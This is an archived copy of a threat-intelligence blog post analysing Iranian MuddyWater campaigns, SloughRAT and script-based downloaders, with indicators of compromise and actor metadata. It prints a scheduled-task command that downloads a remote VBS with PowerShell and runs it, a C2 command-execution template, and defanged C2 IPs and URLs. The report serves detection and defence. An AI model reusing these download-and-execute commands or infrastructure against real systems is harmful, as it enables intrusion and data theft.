{
    "id": "23f78ffa-e114-4a99-9c2e-cb2b15bc6425",
    "created_at": "2023-01-12T15:06:33.43173Z",
    "updated_at": "2025-03-27T02:16:14.017697Z",
    "deleted_at": null,
    "sha1_hash": "56ec53ca944e207ca6d8a0a358925d4463d3c796",
    "title": "2022-03-10 - Iranian linked conglomerate MuddyWater comprised of regionally focused subgroups",
    "authors": "",
    "file_creation_date": "2022-12-29T00:21:22Z",
    "file_modification_date": "2022-12-29T00:21:22Z",
    "file_size": 6032453,
    "plain_text": "# Iranian linked conglomerate MuddyWater comprised of regionally focused subgroups\n\n**[blog.talosintelligence.com/iranian-supergroup-muddywater/](https://blog.talosintelligence.com/iranian-supergroup-muddywater/)**\n\nAsheer Malhotra March 10, 2022\n\nBy [Asheer Malhotra,](https://blog.talosintelligence.com/author/asheer-malhotra/) [Vitor Ventura,](https://blog.talosintelligence.com/author/vitor-ventura/) [Arnaud Zobec](https://blog.talosintelligence.com/author/arnaud/)\n\nThursday, March 10, 2022 08:03\n\n[Threat Spotlight](https://blog.talosintelligence.com/category/threat-spotlight/)\n\nCisco Talos has observed new cyber attacks targeting Turkey and other Asian\ncountries we believe with high confidence are from groups operating under the\n[MuddyWater umbrella of APT groups. U.S. Cyber Command recently connected](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\nMuddyWater to Iran's Ministry of Intelligence and Security (MOIS).\nThese campaigns primarily utilize malicious documents (maldocs) to deploy\ndownloaders and RATs implemented in a variety of languages, such as PowerShell,\nVisual Basic and JavaScript.\nAnother new campaign targeting the Arabian peninsula deploys a WSF-based RAT\nwe're calling \"SloughRAT\", identified as an implant called \"canopy\" by CISA in their\n[advisory released in late February.](https://www.cisa.gov/uscert/ncas/alerts/aa22-055a)\n\n\n-----\n\nBased on a review of multiple MuddyWater campaigns, we assess that the Iranian\nAPT is a conglomerate of multiple teams operating independently rather than a single\nthreat actor group.\nThe MuddyWater supergroup is highly motivated and can use unauthorized access to\n[conduct espionage, intellectual property theft and deploy ransomware and destructive](https://www.cisa.gov/uscert/ncas/alerts/aa20-006a)\nmalware in an enterprise.\n\n## Executive summary\n\nCisco Talos has identified multiple campaigns and tools being perpetrated by the\nMuddyWater APT group, widely considered to be affiliated with Iranian interests. These\nthreat actors are considered extremely motivated and persistent when it comes to targeting\nvictims across the globe.\n\nTalos disclosed a MuddyWater [campaign in January targeting Turkish entities that](https://blog.talosintelligence.com/iranian-apt-muddywater-targets-turkey/)\nleveraged maldocs and executable-based infection chains to deliver multistage,\nPowerShell-based downloader malware. This group previously used the same tactics to\ntarget other countries in Asia, such as Armenia and Pakistan.\n\nIn our latest findings, we discovered a new campaign targeting Turkey and the Arabian\npeninsula with maldocs to deliver a Windows script file (WSF)-based remote access trojan\n[(RAT) we're calling \"SloughRAT\" an implant known by \"canopy\" in CISA's most recent alert](https://www.cisa.gov/uscert/ncas/alerts/aa22-055a)\nfrom February 2022 about MuddyWater.\n\nThis trojan, although obfuscated, is relatively simple and attempts to execute arbitrary code\nand commands received from its command and control (C2) servers.\n\nOur investigation also led to the discovery of the use of two additional script-based\nimplants: one written in Visual Basic (VB) (late 2021 - 2022) and one in JavaScript (2019 2020), which also downloads and runs arbitrary commands on the victim's system.\n\nMuddyWater's variety of lures and payloads — along with the targeting of several different\ngeographic regions — strengthens our growing hypothesis that MuddyWater is a\nconglomerate of sub-groups rather than a single actor. These sub-groups have conducted\ncampaigns against a variety of industries such as national and local governments and\nministries, [universities and private entities such as telecommunication providers. While](https://securelist.com/muddywater/88059/)\nthese teams seem to operate independently, they are all motivated by the same factors that\nalign with Iranian national security objectives, including espionage, intellectual theft, and\ndestructive or disruptive operations based on the victims they target.\n\nA variety of campaigns analyzed are marked by the development and use of distinct\ninfection vectors and tools to gain entry, establish long-term access, siphon valuable\ninformation and monitor their targets. The MuddyWater teams appear to share TTPs, as\n\n\n-----\n\nevidenced by the incremental adoption of various techniques over time in different\nMuddyWater campaigns. We represent this progression in a detailed graphic in the first\nmain section of this blog.\n\n## MuddyWater threat actor\n\nMuddyWater, also known as \"MERCURY\" or \"Static Kitten,\" is an APT group the U.S. Cyber\n[Command recently attributed to Iran's Ministry of Intelligence and Security (MOIS). This](http://vaja.ir/)\nthreat actor, active since at least [2017, frequently conducts campaigns against high-value](https://malpedia.caad.fkie.fraunhofer.de/actor/muddywater)\ntargets in countries in North America, Europe and Asia. MuddyWater campaigns typically\nfall into one of the following categories:\n\n**Espionage: Collecting information on adversaries or regional partners that can benefit**\nIran by helping to advance its political, economic, or national security interests.\n**Intellectual property theft: Stealing intellectual property and other proprietary**\ninformation can benefit Iran in a variety of ways, including helping Iranian businesses\nagainst their competitors, influencing economic policy decisions at the state level, or\ninforming government-related research and design efforts, among others. These\n[campaigns target private and government entities, such as universities, think tanks,](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-espionage-group)\nfederal agencies, and various industry verticals.\n**Ransomware attacks: MuddyWater has previously attempted to deploy ransomware,**\nsuch as Thanos, on victim networks to either destroy evidence of their intrusions or\ndisrupt operations.\n\nMuddyWater frequently relies on the use of DNS to contact their C2 servers, while the initial\ncontact with hosting servers is done via HTTP. Their initial payloads usually use\nPowerShell, Visual Basic and JavaScript scripting along with living-off-the-land binaries\n[(LoLBins) and remote connection utilities to assist in the initial stages of the infection.](https://blog.talosintelligence.com/2019/11/hunting-for-lolbins.html)\n\n## MuddyWater likely comprised of multiple sub-groups\n\nWe assess that MuddyWater is a conglomerate of smaller teams, with each team using\ndifferent targeting tactics against specific regions of the world. They appear to share some\ntechniques and evolve them as needed. This sharing is possibly the result of contractors\nthat move from team to team, or the use of the same development and operational\ncontractors across each team. The latter also explains why we have seen simple indicators\nsuch as unique strings and watermarks shared between MuddyWater and the Phosphorus\n(aka APT35 and Charming Kitten) APT groups. These groups are attributed to different\n[Iranian state organizations — the MOIS and](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/) [IRGC, respectively.](https://www.proofpoint.com/us/blog/threat-insight/operation-spoofedscholars-conversation-ta453)\n\nBased on new information and a review of MuddyWater threat activity and TTPs, we can\n[link together the attacks covered in our January 2022 MuddyWater blog with this most](https://blog.talosintelligence.com/iranian-apt-muddywater-targets-turkey/)\nrecent campaign targeting Turkey and other Asian countries. The graphic below shows the\n\n\n-----\n\noverlap in TTPs and regional targeting between the various MuddyWater campaigns, which\nsuggests these attacks are distinct, yet related, clusters of activity. While some campaigns\ninitially appeared to leverage new TTPs that seemed unrelated to other operations, we later\nfound that they instead demonstrated a broader TTP-sharing paradigm, typical of\ncoordinated operational teams.\n\nTracing MuddyWater's activity over the last year, we see that some of the shared\ntechniques seem to be refined from one region to the other, suggesting the teams use their\npreferred flavors of tools of choice, including final payloads. The above timeline also shows\nthe incremental usage of certain techniques in different campaigns over time, suggesting\nthat they are tested and improved before being implemented in future operations.\n\nThe first two techniques we see being implemented and then shared in future operations\nare signaling tokens and an executable dropper. We first observed the usage of tokens for\nsignaling in April 2021 in a campaign against Pakistan via a simple dropper that downloads\nthe \"Connectwise\" remote administration tool. Later, in June, we see the first usage of the\n\n\n-----\n\nexecutable dropper against Armenia (described in detail in our previous post). The dropped\npayload is a PowerShell script that loads another PowerShell script that downloads and\nexecutes a final PowerShell-based payload.\n\nThe two techniques were then combined later in August 2021 in a campaign targeting\nPakistan, this time still using the homemade tokens. Later, the actors graduated to a more\nprofessional implementation of the token by using canarytokens[.]com's infrastructure.\n```\ncanarytokens[.]com is a legitimate service that MuddyWater uses to make their operations\n\n```\nappear less suspicious. These techniques were next leveraged in a November 2021\ncampaign targeting Turkey in the campaign we described in our January blog. In these\nattacks on Turkey, MuddyWater used maldocs with tokens and the same executable\ndroppers previously seen targeting Armenia and Pakistan.\n\n[In March 2021, we observed MuddyWater using the Ligolo reverse-tunneling tool in attacks](https://github.com/sysdream/ligolo)\non Middle Eastern countries. This tactic was later reused in December 2021, along with the\nintroduction of a new implant. Beginning in December 2021, we observed MuddyWater\nusing a new WSF-based RAT we named \"SloughRAT\" to target countries in the Arabian\nPeninsula, which is described in more detail later in this blog. During our investigation, we\ndiscovered another version of SloughRAT being deployed against entities in Jordan. This\nattack included the deployment of Ligolo — a MuddyWater tactic also corroborated by\n[Trend Micro in March 2021 — following the deployment of SloughRAT.](https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html)\n\nAll these attacks show an interesting pattern: Multiple commonalities in some key infection\nartifacts and TTPs, while retaining enough operational distinctions. This pattern can be\nbroken down into the following practices:\n\nThe introduction of a TTP in one geography, a delay of typically two or three months,\nthen the reuse of that same TTP in a completely different geography, alongside other\nproven TTPs borrowed from campaigns conducted in another geography.\nThe introduction of at least one new TTP completely novel to MuddyWater's tactics in\nalmost every geographically distinct campaign.\n\nThese observations strongly indicate that MuddyWater is a group of groups, each\nresponsible for targeting a specific geography. Each is also responsible for developing\nnovel infection techniques while being allowed to borrow from a pool of TTPs tested in\npreviously separate campaigns.\n\n## Campaigns\n\n### Tying together previous MuddyWater campaigns\n\n\n-----\n\nIn our previous post, we disclosed two campaigns using the same types of Windows\nexecutables — one targeting Turkey in November 2021 and one from June 2021 targeting\nArmenia. Another campaign illustrated previously used similar executables, this time to\ntarget Pakistan. This campaign deployed a PowerShell-based downloader on the endpoint\nto accept and execute additional PS1 commands from the C2 server.\n\nGoing further back, in April 2021, we observed another instance of Muddywater targeting\nentities in Pakistan, this time with a maldoc-based infection vector. The lure document\nclaimed to be part of a court case, as the image below shows.\n\n\n-----\n\nMalicious lure containing a blurred image of the state emblem of Pakistan and referring to a\ncourt case.\n\nIn this case, however, the attackers attempted to deploy the Connectwise Remote Access\nclient on the target's endpoints, a tactic commonly used by MuddyWater to gain an initial\nfoothold on targets' endpoints.\n\n\n-----\n\nIn the attacks deploying the RAT in April 2021 and the EXE-based infection vector from\nAugust 2021, the maldocs and decoy documents reached out to a common server to\ndownload a common image file that links them.\n\nThese campaigns used a homemade implementation of signaling tokens. In this case, the\nmaldocs have an external entity downloaded from an attacker-controller server. This entity\nconsists in a simple image which has no malicious content. The same base URL is\nemployed in both campaigns:\n```\nhxxp://172.245.81[.]135:10196/Geq5P3aFpaSrK3PZtErNgUsVCfqQ9kZ9/\n\n```\nHowever, the maldoc appends the additional URL extension\n\n\"ef4f0d9af47d737076923cfccfe01ba7/layer.jpg\" while the decoy appends \"/Pan```\nop/gallery.jpg\".\n\n```\nThis may be a way for the attackers to track their initial infection vector and determine which\none is more successful. It is highly likely that the attackers used this server as a token\ntracker to keep track of successful infections in this campaign. This token-tracking system\nwas then migrated to CanaryTokens in September 2021 in the attacks targeting Turkey\nusing the malicious Excel documents.\n\n### MuddyWater Middle East campaign using maldocs — SloughRAT\n\nDuring a recent IR engagement, Talos observed multiple instances of malicious documents\n(maldocs) — specifically XLS files — distributed by MuddyWater. These XLS files were\nobserved targeting the Arabian peninsula through a recent phishing campaign.\n\nThe maldoc consists of a malicious macro that drops two WSF files on the endpoint. One of\nthese scripts is the instrumentor script meant to execute the next stage. This instrumentor\nscript is placed in the current user's Startup folder by the VBA macro to establish\npersistence across reboots.\n\nThe second script is a WSF-based RAT we call \"SloughRAT\" that can execute arbitrary\ncommands on the infected endpoint. This RAT consists of obfuscated code from\ninterweaved Visual Basic and JavaScript.\n\n\n-----\n\nExcel document that drops the Outlook.wsf file.\n\n**WSF-based instrumentor script**\n\nAt first glance, the instrumentor script looks complicated because of its obfuscation.\nHowever, at its core, the script is solely meant to execute the next stage WSF RAT payload.\n\nAt runtime, the code deobfuscates two key components for the next stage:\n\nPath to the RAT script that's hard-coded but obfuscated.\nThe de-facto key in the RAT that triggers the malicious code to call.\n\nThis data is then used to make a call to the WSF-based RAT:\n```\ncmd.exe /c <path_to_WSF_RAT> <key>\n\n```\n\n-----\n\nDeobfuscation of persistence.\n\n**SloughRAT analysis**\n\nThe WSF implant has several capabilities. The script uses multilayer obfuscation to hide its\ntrue extensions. The screenshots below are the result of the analysis and are\ndeobfuscations for better comprehension.\n\nThe RAT script needs a function name as an argument to execute correctly and perform its\nmalicious activities. This name is provided by the instrumentor script and could be a method\nof thwarting automated dynamic analysis, since submitting the RAT script in isolation\nwithout the function name as an argument will result in a failed run of the sample in a\nsandbox.\n\nPreliminary information gathering and infection registration\n\nThe RAT script begins execution by performing a WMI query to record the IP address of the\ninfected endpoint.\n\nDeobfuscation of discovery capabilities.\n\nIt will then get the user and computer names by querying the environment variables:\n\n%COMPUTERNAME%\n%USERNAME%\n\n\n-----\n\nDeobfuscation of discovery capabilities.\n\nThis system information is then concatenated using a delimiter and encoded to register the\ninfected system with the C2 server hardcoded into the implant.\n\nFormat:\n```\n<IP_address>|!)!)!|%ComputerName%/%USERNAME%\n\n```\nRAT capabilities\n\nThis RAT's capabilities are relatively simple, aside from the information-gathering\ncapabilities described previously.\n\nOnce the infection is registered with the C2 server, the implant will receive a command code\nfrom the C2 server. The implant uses two different URLs:\n\nOne is used to register the implant and request arbitrary commands from the C2.\nAnother that is used to POST the results of the commands executed on the infected\nendpoint.\n\nThe communication with the C2 is done using the common ServerXMLHTTP from the\nMSXML2 API to instrument an HTTP POST request.\n\nThe time between each request is randomized, which makes the malware stealthier and\ncan bypass some sandboxes.\n\n\n-----\n\nDeobfuscation of HTTP request construction.\n\nAny data sent to the C2 server is in the format of HTTP forms accompanied by relevant\nheaders, like:\n\nContent-Type\nContent-Length\nCharSet.\n\nFirst, the script sends the system information to the first C2 URL, by encoding the message,\nand sending it via POST request, inside the parameter \"vl\" using the following format:\n```\n<IP_address>|!)!)!|%ComputerName%/%USERNAME%\n\n```\nThen, the server returns a UID constructed via concatenation of the server IP and an\nUUIDv4.\n\nFor example, the UID 5-199-133-149-<UUIDv4>\n\nis stored in a variable and sends keep-alive messages to request commands from the C2.\n\nThen, this UID is sent through \"vl\" parameters inside a POST HTTP request to another C2\nURL.\n\n\n-----\n\nWhen the server receives this UID, it returns an encoded message that the script interprets.\n\nThe message can be:\n\n\"ok\": Do nothing and send the UID again (like a keep-alive).\n\"401\": This order cleans the UID variable and forces the script to request another UID,\nby sending a request to the first URI.\nA command to execute that starts the command execution routine.\n\nA command received from the C2 server will be executed using the command line utility. Its\noutput is recorded in a temporary file on disk in a location such as \"%TEMP%\\stari.txt\".\nThis data is then immediately read and sent out to the C2. The message will have the\nfollowing format:\n```\n<UID>|!)!)!|<result of command output>\n\n```\nCommands are executed using the command line:\n```\ncmd.exe /c <command_sent_by_C2> >> <path_to_temp_file>\n\n```\n\n-----\n\nDeobfuscation of command execution routine.\n\nThe attackers used another version of SloughRAT, which isn't as obfuscated as the version\nillustrated earlier, this time targeting entities in the Arabian peninsula. The overall\nfunctionality used in this instance is the same with minor modifications in file paths,\ndelimiters, etc.\n\n\n-----\n\nVersion No. 2 of the WSF RAT — minor changes only.\n\nThe attackers utilized SloughRAT to deploy [Ligolo, an open-source reverse-tunneling tool to](https://github.com/sysdream/ligolo)\ngain a greater degree of control over the infected endpoints. This tactic observed is in sync\nwith [previous findings from Trend Micro.](https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html)\n\nOverall infection chain:\n\n### VBS-based downloaders\n\nIn another instance, we observed the deployment of VBS-based malicious downloaders in\nDecember 2021 and through January 2022 via malicious scheduled tasks set up by the\nattackers. The scheduled task would look something like this:\n\nSchTasks /Create /SC ONCE /ST 00:01 /TN <task_name> /TR powershell -exec bypass -w\n1 Invoke-WebRequest -Uri '<remote_URL_location>' -OutFile\n<malicious_VBS_path_on_endpoint>;\n\nwscript.exe <malicious_VBS_path_on_endpoint>\n\n\n-----\n\nThese tasks download and parse content from the C2 server and execute it on the infected\nendpoint. The output of the command would be written to a temporary file in the\n%APPDATA% directory and subsequently read and exfiltrated to the C2.\n\nThe complete infection chain of these VBS-based downloaders is currently unknown.\n\nVBS-based downloader.\n\n### Older campaign using JS-based downloaders\n\nAn older campaign operated by MuddyWater toward the end of November 2019 and into\n2020 utilized maldocs and a convoluted chain of obfuscated scripts to deploy a JavaScriptbased downloader/stager on the infected endpoint. This campaign also appears to target\nTurkish users.\n\n\n-----\n\nThe maldoc contains a macro that would drop a malicious obfuscated VBS in a directory on\nthe system. The macros would then create persistence for the VBS via the Registry Run\nkey of the current user. This VBS is responsible for deobfuscating the next payloads and\nexecuting them on the endpoint. This execution culminated into a malicious JS downloader\nbeing executed on the system to download and execute commands.\n\n\n-----\n\nJS-based downloader.\n\n\n-----\n\n## Conclusion\n\nCisco Talos has observed Iranian APT groups conducting malicious operations and\nactivities all over the world for years. Particularly, 2021 was prolific in cybersecurity\nincidents for Iran where state-run organizations were targeted. These events were\nattributed to Western nations by the Iranian regime, with the promise of revenge. It's hard to\nsay if these campaigns are the result of such promises or just part of these groups' usual\nactivity. However, the fact that they have changed some of their methods of operation and\ntools is yet another sign of their adaptability and unwillingness to refrain themselves from\nattacking other nations.\n\nWe believe there are links between these different campaigns, including the migration of\ntechniques from region to region, along with their evolution into more advanced versions.\nOverall, the campaigns we describe cover Turkey, Pakistan, Armenia and countries from\nthe Arabian peninsula. While they share certain techniques, these campaigns also denote\nindividuality in the way they were conducted, indicating the existence of multiple sub-teams\nbeneath the Muddywater umbrella — all sharing a pool of tactics and tools to pick and\nchoose from.\n\nIn-depth defense strategies based on a risk analysis approach can deliver the best results\nin protecting against such a highly motivated set of threat actors. However, this should\nalways be complemented by a good incident response plan which has not only been tested\nwith table top exercises, but also reviewed and improved every time it is put to the test on\nreal engagements.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n\n-----\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[execution of the malware detailed in this post. Try Secure Endpoint for free here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\ndetects malware used in these attacks.\n\n[Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by](https://www.cisco.com/c/en/us/products/security/email-security/index.html)\nthreat actors as part of their campaign. You can try Secure Email for free [here.](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Dcmd-free-trial-request%26utm_term%3Dpgm-talos-trial)\n\n[Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\nsuch as [Threat Defense Virtual,](https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html) [Adaptive Security Appliance and](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) [Meraki MX can detect](https://meraki.cisco.com/products/appliances)\nmalicious activity associated with this threat.\n\n\n-----\n\n[Cisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network](https://www.cisco.com/c/en/us/products/security/stealthwatch/index.html)\ntraffic automatically and alerts users of potentially unwanted activity on every connected\ndevice.\n\n[Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\nprotection into all Cisco Secure products.\n\n[Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs and URLs, whether users are on or off the corporate network. Sign up for a\n[free trial of Umbrella here.](https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial)\n\n[Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\npotentially dangerous sites and tests suspicious sites before users access them.\n\nAdditional protections with context to your specific environment and threat data are\n[available from the Firewall Management Center.](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html)\n\n[Cisco Duo provides multi-factor authentication for users to ensure only those authorized are](https://signup.duo.com/?utm_source%3Dtalos%26utm_medium%3Dreferral%26utm_campaign%3Dduo-free-trial)\naccessing your network.\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\nSnort rules for protection against this threat are: 59226 - 59230.\n\n**Orbital Queries**\n\n[Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries](https://orbital.amp.cisco.com/help/)\nto see if their endpoints are infected with this specific threat. For specific OSqueries on this\nthreat, click below:\n\n[Ligolo](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_forensics/ligolo_reverse_tunneling.yaml)\n[SloughRat](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/malware_muddywater_sloughrat_C2_command_output.yaml)\n\n## IOCS\n\n### Maldocs\n```\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c\n\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141\n\n7de663524b63b865e57ffc3eb4a339e150258583fdee6c2c2ca4dd7b5ed9dfe7\n\n6e50e65114131d6529e8a799ff660be0fc5e88ec882a116f5a60a2279883e9c4\n\nef385ed64f795e106d17c0a53dfb398f774a555a9e287714d327bf3987364c1b\n\n WSF\n\n```\n\n-----\n\n```\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0\n\ned988768f50f1bb4cc7fb69f9633d6185714a99ecfd18b7b1b88a42a162b0418\n\nc2badcdfa9b7ece00f245990bb85fb6645c05b155b77deaf2bb7a2a0aacbe49e\n\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0\n\ncc67e663f5f6cea8327e1323ecdb922ae8e48154bbf7bd3f9b2ee2374f61c5d6\n\n### VBS\nfb69c821f14cb0d89d3df9eef2af2d87625f333535eb1552b0fcd1caba38281f\n\n JS\n202bf7a4317326b8d0b39f1fa19304c487128c8bd6e52893a6f06f9640e138e6\n\n3fe9f94c09ee450ab24470a7bcd3d6194d8a375b3383f768662c1d561dab878d\n\ncf9b1e0d17199f783ed2b863b0289e8f209600a37724a386b4482c2001146784\n\n EXEs\na500e5ab8ce265d1dc8af1c00ea54a75b57ede933f64cea794f87ef1daf287a1\n\n IPs\n185[.]118.164.195\n\n5[.]199[.]133[.]149\n\n88[.]119[.]170[.]124\n\n185[.]183[.]97[.]25\n\n95[.]181.161.81\n\n178[.]32[.]30[.]3\n\n URLs\nhxxp://185[.]118.164.195/c\n\nhxxp://5[.]199[.]133[.]149/oeajgyxyxclqmfqayv\n\nhxxp://5[.]199[.]133[.]149/jznkmustntblvmdvgcwbvqb\n\nhxxp://88[.]119.170.124/lcekcnkxkbllmwlpoklgof\n\nhxxp://88[.]119.170.124/ezedcjrfvjriftmldedu\n\nhxxp://178[.]32.30.3:80/kz10n2f9d5c4pkz10n2f9s2vhkz10n2f9/gcvvPu2KXdqEbDpJQ33/\n\nhxxp://178[.]32.30.3:80/kz10n2f9d5c4pkz10n2f9s2vhkz10n2f9/rrvvPu2KXdqEbDpJQ33/\n\nhxxp://185[.]183.97.25/protocol/function.php\n\nhxxp://lalindustries[.]com/wp-content/upgrade/editor.php\n\nhxxp://advanceorthocenter[.]com/wp-includes/editor.php\n\nhxxp://95[.]181.161.81/i100dfknzphd5k\n\nhxxp://95[.]181.161.81/mm57aayn230\n\nhxxp://95[.]181.161.81:443/main.exe\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-10 - Iranian linked conglomerate MuddyWater comprised of regionally focused subgroups.pdf"
    ],
    "report_names": [
        "2022-03-10 - Iranian linked conglomerate MuddyWater comprised of regionally focused subgroups.pdf"
    ],
    "threat_actors": [
        {
            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
            "created_at": "2022-10-25T15:50:23.850506Z",
            "updated_at": "2025-03-27T02:00:55.501372Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Charming Kitten"
            ],
            "source_name": "MITRE:Charming Kitten",
            "tools": [
                "DownPaper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ae26d287-8ba7-447e-9391-cf13c02d7481",
            "created_at": "2023-03-04T02:01:54.0962Z",
            "updated_at": "2025-03-27T02:00:03.120665Z",
            "deleted_at": null,
            "main_name": "TA453",
            "aliases": [],
            "source_name": "MISPGALAXY:TA453",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
            "created_at": "2023-01-06T13:46:38.748929Z",
            "updated_at": "2025-03-27T02:00:02.908256Z",
            "deleted_at": null,
            "main_name": "APT35",
            "aliases": [
                "Newscaster Team",
                "Magic Hound",
                "G0059",
                "Phosphorus",
                "Mint Sandstorm",
                "TunnelVision",
                "COBALT MIRAGE"
            ],
            "source_name": "MISPGALAXY:APT35",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "04888f75-158b-47f9-8ad9-4ff83f618ece",
            "created_at": "2024-05-01T02:03:08.03763Z",
            "updated_at": "2025-03-27T02:05:17.319276Z",
            "deleted_at": null,
            "main_name": "COBALT MIRAGE",
            "aliases": [
                "Nemesis Kitten ",
                "PHOSPHORUS ",
                "TunnelVision ",
                "UNC2448 ",
                "DEV-0270 "
            ],
            "source_name": "Secureworks:COBALT MIRAGE",
            "tools": [
                " Custom powershell scripts",
                " DiskCryptor",
                " Drokbk",
                " FRPC",
                " Fast Reverse Proxy (FRP)",
                " Impacket wmiexec",
                " Ngrok",
                " Plink",
                " PowerLessCLR",
                " TunnelFish",
                "BitLocker"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
